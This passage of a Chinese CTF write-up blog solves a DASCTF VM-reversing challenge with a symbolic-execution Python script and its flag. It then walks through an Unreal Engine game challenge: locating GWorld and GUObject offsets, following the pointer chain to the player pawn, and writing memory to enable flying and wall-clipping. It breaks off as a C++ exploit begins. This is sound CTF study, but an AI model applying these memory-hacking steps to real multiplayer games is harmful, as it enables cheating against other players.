rX：把寄存器写回内存。</li><li>cmp rX, imm：比较寄存器是否等于常数。</li></ul><p> 假设字节码只有 5 条：</p><pre><code>1. set r0, 0          ; 把寄存器0清零2. load r1, 0         ; 读取 x03. add r0, r1         ; r0 += x04. load r1, 1         ; r1 = x15. add r0, r1         ; r0 += x16. load r1, 2         ; r1 = x27. add r0, r1         ; r0 += x28. cmp r0, 100        ; 检查 x0 + x1 + x2 == 100 ?</code></pre><p>这题的思路就是</p><p>把他们符号化</p><p>mem[0] &#x3D; x0</p><p>mem[1] &#x3D; x1</p><p>mem[2] &#x3D; x2</p><p>然后按指令跑：</p><ul><li>指令 1：r0 &#x3D; 0</li><li>指令 2：r1 &#x3D; x0</li><li>指令 3：r0 &#x3D; r0 + r1 &#x3D; 0 + x0 &#x3D; x0</li><li>指令 4：r1 &#x3D; x1</li><li>指令 5：r0 &#x3D; x0 + x1</li><li>指令 6：r1 &#x3D; x2</li><li>指令 7：r0 &#x3D; x0 + x1 + x2</li><li>指令 8：要求 r0 &#x3D;&#x3D; 100</li></ul><p>因此我们得到一个线性方程：x0 + x1 + x2 &#x3D; 100。</p><p>如果再来一个块，让它计算 x0 - x1 + 2*x2 &#x3D; 50，响应用符号执行同样的流程，就能得到第二条方程。把这两条放在一起就是个小的线性方程组，解出来就能知道三个输入字符的值。</p><p>为什么能这样?因为我们之前观察了指令</p><ol><li>只有线性变化</li><li>执行约260条指令才check，也就是这么多指令对应一个check</li></ol><p>不就刚好组成一个方程组了吗 0.0</p><p>exp：</p><blockquote><p>GPT5帮着修了好久的脚本</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"></span><br><span class="line">MOD = <span class="number">1</span> &lt;&lt; <span class="number">16</span></span><br><span class="line">BLOCK_SIZE = <span class="number">260</span></span><br><span class="line">NUM_BLOCKS = <span class="number">36</span></span><br><span class="line">INSTR_COUNT = BLOCK_SIZE * NUM_BLOCKS</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">locate_bytecode</span>(<span class="params">blob, need=INSTR_COUNT</span>):</span><br><span class="line">    run = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(blob) - <span class="number">8</span>, <span class="number">8</span>):</span><br><span class="line">        opcode = <span class="built_in">int</span>.from_bytes(blob[off + <span class="number">6</span>:off + <span class="number">8</span>], <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt;= opcode &lt;= <span class="number">0xC</span>:</span><br><span class="line">            run += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> run == need:</span><br><span class="line">                <span class="keyword">return</span> off - (need - <span class="number">1</span>) * <span class="number">8</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            run = <span class="number">0</span></span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;bytecode blob not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_expr</span>(<span class="params">a, b</span>):</span><br><span class="line">    keys = <span class="built_in">set</span>(a) | <span class="built_in">set</span>(b)</span><br><span class="line">    <span class="keyword">return</span> &#123;k: (a.get(k, <span class="number">0</span>) + b.get(k, <span class="number">0</span>)) % MOD <span class="keyword">for</span> k <span class="keyword">in</span> keys&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_expr</span>(<span class="params">a, b</span>):</span><br><span class="line">    keys = <span class="built_in">set</span>(a) | <span class="built_in">set</span>(b)</span><br><span class="line">    <span class="keyword">return</span> &#123;k: (a.get(k, <span class="number">0</span>) - b.get(k, <span class="number">0</span>)) % MOD <span class="keyword">for</span> k <span class="keyword">in</span> keys&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_block</span>(<span class="params">insts</span>):</span><br><span class="line">    regs = &#123;i: &#123;<span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>)&#125;</span><br><span class="line">    mem = &#123;i: &#123;<span class="string">f&#x27;x<span class="subst">&#123;i&#125;</span>&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125; <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>)&#125;</span><br><span class="line">    mem[<span class="number">0x26</span>] = &#123;<span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> dst, op1, op2, opcode <span class="keyword">in</span> insts:</span><br><span class="line">        <span class="keyword">if</span> opcode == <span class="number">1</span>:  <span class="comment"># set reg</span></span><br><span class="line">            regs[dst] = &#123;<span class="string">&#x27;const&#x27;</span>: op1 % MOD&#125;</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">3</span>:  <span class="comment"># add</span></span><br><span class="line">            regs[dst] = add_expr(regs[op1], regs[op2])</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">10</span>:  <span class="comment"># sub</span></span><br><span class="line">            regs[dst] = sub_expr(regs[op1], regs[op2])</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">5</span>:  <span class="comment"># store mem</span></span><br><span class="line">            addr = regs[dst][<span class="string">&#x27;const&#x27;</span>] % MOD</span><br><span class="line">            mem[addr] = <span class="built_in">dict</span>(regs[op1])</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">6</span>:  <span class="comment"># load mem</span></span><br><span class="line">            addr = regs[dst][<span class="string">&#x27;const&#x27;</span>] % MOD</span><br><span class="line">            regs[op1] = <span class="built_in">dict</span>(mem.get(addr, &#123;<span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125;))</span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">4</span>:  <span class="comment"># xor (实际上只用于清零)</span></span><br><span class="line">            regs[dst] = &#123;<span class="string">&#x27;const&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line">        <span class="comment"># 其它 opcode（比较/校验）不会影响线性方程，忽略即可</span></span><br><span class="line">    expr = mem[<span class="number">0x26</span>]</span><br><span class="line">    coeffs = [<span class="number">0</span>] * <span class="number">36</span></span><br><span class="line">    <span class="keyword">for</span> label, value <span class="keyword">in</span> expr.items():</span><br><span class="line">        <span class="keyword">if</span> label == <span class="string">&#x27;const&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        idx = <span class="built_in">int</span>(label[<span class="number">1</span>:])</span><br><span class="line">        coeffs[idx] = value <span class="keyword">if</span> value &lt; <span class="number">0x8000</span> <span class="keyword">else</span> value - <span class="number">0x10000</span></span><br><span class="line">    target = regs[<span class="number">1</span>][<span class="string">&#x27;const&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> target &gt;= <span class="number">0x8000</span>:</span><br><span class="line">        target -= <span class="number">0x10000</span></span><br><span class="line">    <span class="keyword">return</span> coeffs, target</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_system</span>(<span class="params">blob</span>):</span><br><span class="line">    start = locate_bytecode(blob)</span><br><span class="line">    coeffs, targets = [], []</span><br><span class="line">    <span class="keyword">for</span> blk <span class="keyword">in</span> <span class="built_in">range</span>(NUM_BLOCKS):</span><br><span class="line">        base = start + blk * BLOCK_SIZE * <span class="number">8</span></span><br><span class="line">        block = [</span><br><span class="line">            struct.unpack_from(<span class="string">&#x27;&lt;HHHH&#x27;</span>, blob, base + i * <span class="number">8</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(BLOCK_SIZE)</span><br><span class="line">        ]</span><br><span class="line">        row, rhs = run_block(block)</span><br><span class="line">        coeffs.append(<span class="built_in">list</span>(<span class="built_in">map</span>(Fraction, row)))</span><br><span class="line">        targets.append(Fraction(rhs))</span><br><span class="line">    <span class="keyword">return</span> coeffs, targets</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_linear</span>(<span class="params">A, b</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(A)</span><br><span class="line">    M = [row[:] <span class="keyword">for</span> row <span class="keyword">in</span> A]</span><br><span class="line">    y = b[:]</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        pivot = <span class="built_in">max</span>(<span class="built_in">range</span>(col, n), key=<span class="keyword">lambda</span> r: <span class="built_in">abs</span>(M[r][col]))</span><br><span class="line">        <span class="keyword">if</span> M[pivot][col] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;singular matrix&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> pivot != col:</span><br><span class="line">            M[col], M[pivot] = M[pivot], M[col]</span><br><span class="line">            y[col], y[pivot] = y[pivot], y[col]</span><br><span class="line">        pivot_val = M[col][col]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(col, n):</span><br><span class="line">            M[col][j] /= pivot_val</span><br><span class="line">        y[col] /= pivot_val</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(col + <span class="number">1</span>, n):</span><br><span class="line">            factor = M[row][col]</span><br><span class="line">            <span class="keyword">if</span> factor == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(col, n):</span><br><span class="line">                M[row][j] -= factor * M[col][j]</span><br><span class="line">            y[row] -= factor * y[col]</span><br><span class="line">    x = [Fraction(<span class="number">0</span>)] * n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        s = y[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i + <span class="number">1</span>, n):</span><br><span class="line">            s -= M[i][j] * x[j]</span><br><span class="line">        x[i] = s</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>(<span class="built_in">round</span>(val)) <span class="keyword">for</span> val <span class="keyword">in</span> x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    blob = <span class="built_in">open</span>(<span class="string">&#x27;chall&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    A, b = build_system(blob)</span><br><span class="line">    chars = solve_linear(A, b)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> chars)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>DASCTF{w4ll_CpP_4nD_1O5_1S_Qu1T_FuN}</p><h2 id="那些努力过没出的题"><a href="#那些努力过没出的题" class="headerlink" title="那些努力过没出的题"></a>那些努力过没出的题</h2><h3 id="Python’s-Shed-Skin"><a href="#Python’s-Shed-Skin" class="headerlink" title="Python’s Shed Skin"></a>Python’s Shed Skin</h3><p>可惜了，delta好像是0xdeadbeef，好像魔改了50，纯静态分析，时间不够了，花时间调一下有可能可以做出来</p><p><a href="https://tool.lu/pyc/">python反编译 - 在线工具</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ezpy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    user_input = <span class="built_in">input</span>(<span class="string">&#x27;Please input your flag: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> ezpy.encrypt_check_flag(user_input):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Correct Flag! You are a master of reversing!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Wrong Flag! Keep trying.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Overwatch"><a href="#Overwatch" class="headerlink" title="Overwatch"></a>Overwatch</h3><p>比较想做出来的一道题</p><p>overwatch的话偏移搞错了，不然应该至少能出一段flag，一直以为是gworld搞错了，因为之前提取一直报错提示我gobject，后来能dump，却只有一点信息，那么猜想必然是gworld错了…结果打脸了</p><p>还有就是不知道为什么搜索seameless还有些常见字符串都搜索不到，出现这种情况，或者直接没有，看了源码才勉强能搜到一两个…</p><p><strong>赛后下面那个偏移问题(主要是被网上某篇瞎写的博客和IDA字符串加载给暗算了)解决了自己做了下直接出了一段flag，后一段flag没找到只能看wp了</strong></p><blockquote><p>好的!我知道了尴尬了，我还是太着急了，刚刚写这个wp的时候又打开来了(之前保存的i64)，搜了一下seamless，发现直接出现了，原来是IDA加载太慢了，我太急了，我就不该上课 T.T </p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013222036823.png" alt="image-20251013222036823"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013221924088.png" alt="image-20251013221924088"></p></blockquote><p>dump工具：<a href="https://github.com/Spuckwaffel/UEDumper">Spuckwaffel&#x2F;UEDumper: The most powerful Unreal Engine Dumper and Editor for UE 4.19 - 5.3</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251012162204075.png" alt="image-20251012162204075"></p><p>可以看这个视频</p><p><a href="https://www.youtube.com/watch?v=M7VLd1xrVoM">https://www.youtube.com/watch?v=M7VLd1xrVoM</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251012172315439.png" alt="image-20251012172315439"></p><p>说一下找三件套吧</p><p>Fname找ByteObject</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102225239.png" alt="image-20251014102225239"></p><p>交叉引用这个方法，是最上面那个</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102258624.png" alt="image-20251014102258624"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102334465.png" alt="image-20251014102334465"></p><p>第一个偏移：0x4869C80</p><blockquote><p>ps：可以看那个印度佬的视频，挺好的，先去rebase里把机制定位0</p></blockquote><p>找UWorld时，我是IDA没加载出来这个”Seamless”字符串</p><blockquote><p>关于如何对照源码<a href="https://www.bilibili.com/video/BV19R4y1g7i3/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&vd_source=d76ad0aadca055336653cd966075f064">虚幻4 UE4 逆向 寻找 世界地址 UWORLD地址 教程_哔哩哔哩_bilibili</a></p><p>可以先去github把对应版本的源码下载下来，需要加入epicgame组织先，</p></blockquote><p>所以我对照了源码最终找到一个</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102621791.png" alt="image-20251014102621791"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014102704430.png" alt="image-20251014102704430"></p><p>当然常规的方法更简单一点</p><blockquote><p>搜索： SeamlessTravel FlushLevelStreaming</p></blockquote><p>往上直接找到：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014103045269.png" alt="image-20251014103045269"></p><p>第二个uworld有了：49ee370</p><p>第三个gobject，我也是死在这了…</p><p>我找的偏移是0x48A5FC0</p><p>看了wp发现是：0x48A5FD0</p><p>….</p><p>就差0x10，可能是数据结构哪里搞错了应该</p><p>当时找了</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014104421969.png" alt="image-20251014104421969"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014104434870.png" alt="image-20251014104434870"></p><p>当时字符串没加载出来，简单的把48A5FC0作为Gobject肯定不对，都跟上面不太像其实</p><p>实际上被误导了?</p><p><a href="https://www.cnblogs.com/revercc/p/17641855.html#%E5%AF%BB%E6%89%BEguobjectarray">ue5游戏逆向之寻找GWorld，GName和GUObjectArray - 怎么可以吃突突 - 博客园</a></p><p>这里虽然是ue5的方法，但是道理应该差不多，为什么偏移不对?</p><p>官解搜索的是：NewObject with….</p><p>可是我看了下引用：</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014105547046.png" alt="image-20251014105547046"></p><p>这找个damn…</p><p>不知道是不是我IDA的原因</p><p>运气足够好,第二个就是</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014105748059.png" alt="image-20251014105748059"></p><p>但是我并没有找到源码中对应的寻找方式，可能是源码中把NewObject字符串包装了，得搜索引用这个函数的才能去找GUObject</p><p>推荐搜索Failed to load Enginee class，跟刚才的NewObject With到达的是一个地方</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110256024.png" alt="image-20251014110256024"></p><p>48A5FD0</p><p>offset.h里填好</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110520421.png" alt="image-20251014110520421"></p><p>dump成功如下</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014110946452.png" alt="image-20251014110946452"></p><p>后面就是游戏逆向，猜测flag在墙外，因而只有几种常规方法：透视(墙不见) 穿墙 飞天遁地</p><p>在merged_AudioMixer_Engine_UMG_MovieScene_MovieSceneTracks.h种有</p><blockquote><p>这个文件不是引擎原生的源码文件，而是 <strong>自动合并生成的头文件</strong>，</p><p>目的是把多个模块导出的类、枚举、结构体合并在一个文件中方便分析。</p></blockquote><p>这个枚举定义在 UE 原版引擎中是 <strong>角色移动组件（Character Movement Component）</strong> 的核心枚举</p><table><thead><tr><th>模式</th><th>场景举例</th><th>行为逻辑</th></tr></thead><tbody><tr><td><code>MOVE_None</code></td><td>不可移动（如被眩晕、冻结）</td><td>停止更新物理</td></tr><tr><td><code>MOVE_Walking</code></td><td>在地面上走</td><td>使用地面摩擦力、速度计算</td></tr><tr><td><code>MOVE_NavWalking</code></td><td>AI 路径导航行走</td><td>使用 NavMesh</td></tr><tr><td><code>MOVE_Falling</code></td><td>从高处坠落</td><td>使用重力</td></tr><tr><td><code>MOVE_Swimming</code></td><td>在水中游动</td><td>使用流体阻力、浮力</td></tr><tr><td><code>MOVE_Flying</code></td><td>飞行类角色（如幽灵、飞行器）</td><td>关闭重力，使用自由三维移动</td></tr><tr><td><code>MOVE_Custom</code></td><td>自定义移动，如“攀爬”、“滑行”</td><td>游戏开发者自己扩展逻辑</td></tr></tbody></table><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014193847028.png" alt="image-20251014193847028"></p><p>我们能发现这里还有</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014201041665.png" alt="image-20251014201041665"></p><p>ACharacter是什么?</p><blockquote><p>ACharacter：UE4 自带的行走类Actor，继承自 APawn。含网格体、胶囊体、UCharacterMovementComponent 等，负责角色移动、跳跃等行为。你操作飞行&#x2F;穿墙时的目标对象就是本地玩家的 ACharacter 实例</p></blockquote><p>这些是 <strong>编译时静态断言（static_assert）</strong>，用于验证 <strong>类成员变量的内存偏移</strong>是否正确。</p><p><code>UCharacterMovementComponent::MovementMode</code> 与 <code>PendingLaunchVelocity</code>这些字段属于 <code>UCharacterMovementComponent</code>（角色移动组件），控制角色的物理状态。</p><p>我们除了这些关键属性之外还需要知道世界链路</p><p>在 UE 逆向中，<strong>找到世界链路</strong> 是理解游戏对象体系的关键。</p><p><strong>世界结构简图：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GWorld → UWorld</span><br><span class="line">         ├─ PersistentLevel (ULevel)</span><br><span class="line">         │   ├─ AActor[0] = DefaultPawn</span><br><span class="line">         │   ├─ AActor[1] = PlayerCharacter</span><br><span class="line">         │   └─ ...</span><br><span class="line">         ├─ GameInstance</span><br><span class="line">         ├─ GameMode</span><br><span class="line">         ├─ PlayerController</span><br><span class="line">         └─ etc.</span><br></pre></td></tr></table></figure><table><thead><tr><th>名称</th><th>类型</th><th>含义</th></tr></thead><tbody><tr><td><strong><code>GWorld</code></strong></td><td><code>UWorld*</code> 全局指针</td><td>当前正在运行的世界（全局变量）</td></tr><tr><td><strong><code>UWorld</code></strong></td><td>类对象</td><td>世界实例本身，包含关卡、玩家、Actor 列表等</td></tr></tbody></table><blockquote><p><code>GWorld</code> 就是指向当前 <code>UWorld</code> 的全局变量。</p></blockquote><p>在内存调试中，通常会通过 <code>GWorld</code> 找到整个世界的根：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UWorld* World = GWorld;</span><br><span class="line">ULevel* Level = World-&gt;PersistentLevel;</span><br><span class="line">TArray&lt;AActor*&gt; Actors = Level-&gt;Actors;</span><br></pre></td></tr></table></figure><p>这样就能遍历世界中所有的角色对象。</p><table><thead><tr><th>元素</th><th>含义</th><th>逆向用途</th></tr></thead><tbody><tr><td><code>offsetof</code></td><td>成员偏移</td><td>定位内存字段、直接读写对象成员</td></tr><tr><td><code>CharacterMovement</code></td><td>角色移动组件指针</td><td>控制角色物理行为（走、飞、跳）</td></tr><tr><td><code>CapsuleComponent</code></td><td>碰撞体组件</td><td>检测碰撞、修改 hitbox 尺寸</td></tr><tr><td><code>MovementMode</code></td><td>当前移动模式</td><td>判断或强制移动状态</td></tr><tr><td><code>PendingLaunchVelocity</code></td><td>等待应用的速度</td><td>修改跳跃或击飞效果</td></tr><tr><td><code>GWorld → UWorld</code></td><td>世界根节点</td><td>遍历所有 Actor，找到玩家对象</td></tr></tbody></table><p>在游戏中找到了玩家对象地址 <code>PlayerCharacter</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UCharacterMovementComponent* MoveComp =  *(UCharacterMovementComponent**)(PlayerCharacter + 0x288);</span><br></pre></td></tr></table></figure><p>接下来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MoveComp-&gt;MovementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">MoveComp-&gt;PendingLaunchVelocity = FVector(0, 0, 3000);</span><br></pre></td></tr></table></figure><p>角色立刻能在空中飞行或超高跳。</p><ul><li>UWorld::OwningGameInstance：指向当前世界所属的 UGameInstance。GameInstance 持有全局状态，如本地玩家列表、子系统等，是沿 GWorld 找到你这边玩家控制器的入口。</li><li>APawn：可被玩家或 AI 控制的 Actor 基类。ACharacter 就是 APawn 的一个扩展版本，加入了骨骼网格和 CharacterMovement。</li><li>APlayerController::AcknowledgedPawn：玩家控制器当前“正式控制”的 Pawn 指针。正常游戏里它就是你的角色 Pawn（如 ACharacter），读取后才能继续修改移动组件&#x2F;碰撞。</li><li>APlayerController：表示本地或远端的玩家控制器，处理输入、相机、HUD 等。我们从 UGameInstance::LocalPlayers 取得的 ULocalPlayer-&gt;PlayerController 就是本地玩家的控制器，顺着它的 AcknowledgedPawn 拿到角色后才能进行后续 hack。</li></ul><p>世界链路</p><ul><li>GWorld（基址 base + 0x49EE370，与setOffsets() 中 OFFSET_GWORLD 相符）指向当前关卡对应的 UWorld。</li><li>UWorld + 0x180（OwningGameInstance）拿到 UGameInstance，这是全局封装玩家列表的对象。</li><li>UGameInstance + 0x38（LocalPlayers 的 TArray）提供本地玩家数组，下标 0 通常是本地玩家。</li><li>ULocalPlayer-&gt;PlayerController（UPlayer::PlayerController 在 …:8986 给出 0x30）接到 APlayerController，再用 AcknowledgedPawn 偏移 0x2A0 取到实际 Pawn。</li><li>Pawn + 0x288（CharacterMovement）就能定位 UCharacterMovementComponent；后续通过 MovementMode、PendingLaunchVelocity 等偏移修改为飞行或冲刺，或者抓取 CapsuleComponent(0x290) 调 SetCollisionEnabled 实现穿墙。</li></ul><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014220645122.png" alt="image-20251014220645122"></p><p>在编写代码时我们可以用reinterpret_cast</p><p>reinterpret_cast<T>(expr) 是 C++ 提供的强制类型转换之一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在没有类型信息/类定义不足的情况下，把某个指针或整数当成别的类型的指针来访问。</span><br><span class="line">与UE这类内存操作结合时，我们经常只有偏移值，所以先把基址转成 uint8_t*，加偏移后再 reinterpret_cast&lt;目标类型*&gt;，这样就能把那块内存看成某个字段或结构。</span><br></pre></td></tr></table></figure><p>FVector 在 BasicType.h 里被定义成三个 float 分量（X&#x2F;Y&#x2F;Z）。C++ 允许对这种简单结构做聚合初始化，{a, b, c} 就会依次填入 X&#x2F;Y&#x2F;Z，所以 {0.f, 0.f, 800.f} 会写成 (0,0,800)。</p><p>数值 800&#x2F;600 只是示例：PendingLaunchVelocity 相当于给角色一个即将施加的冲量，LastUpdateVelocity 是当前速度。这两个字段只要写入任何 FVector，UE4 就会按这些分量处理运动；如果想要更慢或更快的上升，可以自己改成别的值。</p><p>exp：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 